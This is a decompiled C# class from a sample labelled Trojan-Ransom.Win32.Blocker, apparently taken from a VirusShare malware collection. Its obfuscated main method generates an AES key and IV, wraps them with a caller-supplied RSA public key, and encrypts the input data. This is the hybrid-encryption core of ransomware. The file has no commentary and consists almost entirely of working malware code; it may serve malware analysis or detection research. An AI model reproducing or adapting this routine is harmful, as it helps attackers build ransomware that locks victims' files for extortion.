// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴍ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace Ⴈ
{
  internal sealed class Ⴍ
  {
    public static string Ⴃ;

    public static byte[] Ⴀ(byte[] Ⴗ, string Ⴍ)
    {
      int num1;
      RijndaelManaged rijndaelManaged;
      RSACryptoServiceProvider cryptoServiceProvider;
      MemoryStream memoryStream;
      CryptoStream cryptoStream;
      int num2;
      byte[] numArray1;
      int num3;
      byte[] numArray2;
      int num4;
      byte[] numArray3;
      byte[] numArray4;
      byte[] numArray5;
      byte[] buffer1;
      byte[] buffer2;
      byte[] numArray6;
      int num5;
      int num6;
      int num7;
      try
      {
label_3:
        num1 = !AppNameFinder.Ⴓ(Ⴍ, ႷႭ.ႥႳ(1491049469, 2), 545, 614) ? 0 : 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              goto label_6;
            case 1:
              goto label_7;
            case 2:
              goto label_5;
            case 4:
              goto label_4;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ);
              num1 = 5;
              continue;
          }
        }
label_4:
        Ⴍ.Ⴃ = ႷႭ.ႥႳ(1491049467, 0);
label_5:
        return (byte[]) null;
label_6:
        rijndaelManaged = (RijndaelManaged) null;
label_7:
        cryptoServiceProvider = (RSACryptoServiceProvider) null;
        memoryStream = (MemoryStream) null;
        cryptoStream = (CryptoStream) null;
        try
        {
          num2 = 4;
          while (true)
          {
            switch (num2)
            {
              case 0:
                AutoHeightLabel.Ⴐ((SymmetricAlgorithm) rijndaelManaged, 625, 527);
                num2 = 1;
                continue;
              case 1:
                numArray1 = new byte[48];
                goto case 2;
              case 2:
                AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 863, 892), 0, (Array) numArray1, 0, 32, 749, 758);
                num2 = 8;
                continue;
              case 3:
                goto label_16;
              case 5:
              case 8:
                AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 746, 718), 0, (Array) numArray1, 32, 16, 179, 168);
                num2 = 3;
                continue;
              case 6:
                Ⴈ.Ⴀ.Ⴀ((SymmetricAlgorithm) rijndaelManaged, 179, 139);
                goto case 0;
              default:
                rijndaelManaged = new RijndaelManaged();
                cryptoServiceProvider = new RSACryptoServiceProvider();
                Ⴜ.Ⴗ((AsymmetricAlgorithm) cryptoServiceProvider, Ⴍ, 914, 967);
                num2 = 6;
                continue;
            }
          }
label_16:
          memoryStream = new MemoryStream();
          try
          {
            num3 = 6;
            while (true)
            {
              switch (num3)
              {
                case 0:
                case 2:
                  goto label_21;
                case 1:
                  FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴓ(numArray2.Length / 8, 927, 1012), 342, 355);
                  num3 = 0;
                  continue;
                default:
                  numArray2 = ReportSender1.Ⴈ(cryptoServiceProvider, numArray1, false, 478, 455);
                  FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, (byte) 1, 413, 424);
                  num3 = 1;
                  continue;
              }
            }
label_21:
            ReportSender1.Ⴍ((Stream) memoryStream, numArray2, 0, numArray2.Length, 583, 569);
          }
          catch (CryptographicException ex1)
          {
            try
            {
              num4 = 10;
              while (true)
              {
                switch (num4)
                {
                  case 1:
                    AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 41, 10), 16, (Array) numArray4, 0, 16, 534, 525);
                    goto case 3;
                  case 2:
                  case 4:
                    num4 = 8;
                    continue;
                  case 3:
                    num4 = 6;
                    continue;
                  case 5:
                    buffer2 = ReportSender1.Ⴈ(cryptoServiceProvider, SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 133, 161), false, 677, 700);
                    goto case 2;
                  case 6:
                    numArray5 = ReportSender1.Ⴈ(cryptoServiceProvider, numArray3, false, 653, 660);
                    buffer1 = ReportSender1.Ⴈ(cryptoServiceProvider, numArray4, false, 155, 130);
                    num4 = 5;
                    continue;
                  case 7:
                    ReportSender1.Ⴍ((Stream) memoryStream, numArray5, 0, numArray5.Length, 67, 61);
                    num4 = 9;
                    continue;
                  case 8:
                    FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, (byte) 2, 444, 393);
                    FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴓ(numArray5.Length / 8, 254, 149), 667, 686);
                    num4 = 7;
                    continue;
                  case 9:
                    goto label_33;
                  default:
                    numArray3 = new byte[16];
                    numArray4 = new byte[16];
                    AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 564, 535), 0, (Array) numArray3, 0, 16, 706, 729);
                    num4 = 1;
                    continue;
                }
              }
label_33:
              memoryStream.Write(buffer1, 0, buffer1.Length);
              memoryStream.Write(buffer2, 0, buffer2.Length);
            }
            catch (CryptographicException ex2)
            {
              Ⴍ.Ⴃ = Ⴈ.Ⴀ.Ⴐ(1468303607, 5);
              numArray6 = (byte[]) null;
              goto label_53;
            }
            num5 = 0;
            switch (num5)
            {
            }
          }
          num6 = 4;
          while (true)
          {
            switch (num6)
            {
              case 0:
              case 5:
                goto label_39;
              case 1:
                goto label_53;
              case 3:
                goto label_40;
              default:
                cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
                cryptoStream.Write(Ⴗ, 0, Ⴗ.Length);
                num6 = 5;
                continue;
            }
          }
label_39:
          cryptoStream.FlushFinalBlock();
label_40:
          numArray6 = memoryStream.ToArray();
        }
        catch (Exception ex)
        {
          Ⴍ.Ⴃ = Ⴈ.Ⴀ.Ⴐ(1468303435, 3) + ex.Message;
          numArray6 = (byte[]) null;
        }
        finally
        {
          num7 = 11;
          while (true)
          {
            switch (num7)
            {
              case 0:
              case 2:
                memoryStream.Close();
                goto case 9;
              case 1:
                goto label_52;
              case 3:
              case 6:
                rijndaelManaged.Clear();
                goto case 4;
              case 4:
                num7 = cryptoServiceProvider == null ? 5 : 10;
                continue;
              case 5:
                num7 = memoryStream == null ? 9 : 0;
                continue;
              case 9:
                num7 = cryptoStream == null ? 1 : 12;
                continue;
              case 10:
                cryptoServiceProvider.Clear();
                goto case 5;
              case 12:
                goto label_51;
              default:
                num7 = rijndaelManaged == null ? 4 : 3;
                continue;
            }
          }
label_51:
          cryptoStream.Close();
label_52:;
        }
label_53:
        switch (2)
        {
          default:
            return numArray6;
        }
      }
      catch (Exception ex)
      {
        int num8;
        object[] objects = new object[23]
        {
          (object) rijndaelManaged,
          (object) cryptoServiceProvider,
          (object) memoryStream,
          (object) cryptoStream,
          (object) numArray1,
          (object) numArray2,
          (object) numArray3,
          (object) numArray4,
          (object) numArray5,
          (object) buffer1,
          (object) buffer2,
          (object) ex,
          (object) numArray6,
          (object) num1,
          (object) num2,
          (object) num3,
          (object) num4,
          (object) num5,
          (object) num6,
          (object) num7,
          (object) num8,
          (object) Ⴗ,
          (object) Ⴍ
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public Ⴍ()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static Ⴍ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static void Ⴄ([In] Control obj0, [In] Font obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              goto label_7;
            case 2:
              goto label_8;
            case 3:
              num1 = 1;
              continue;
            case 5:
              goto label_10;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 47:
                  num2 = 0;
                  break;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_10:
        return;
label_7:
        obj0.Font = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        Font o4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static void Ⴐ([In] Form obj0, [In] Icon obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 5:
              goto label_7;
            case 2:
              num1 = 4;
              continue;
            case 3:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 64:
                  num2 = 1;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Icon = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Form o3 = obj0;
        Icon o4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }
  }
}
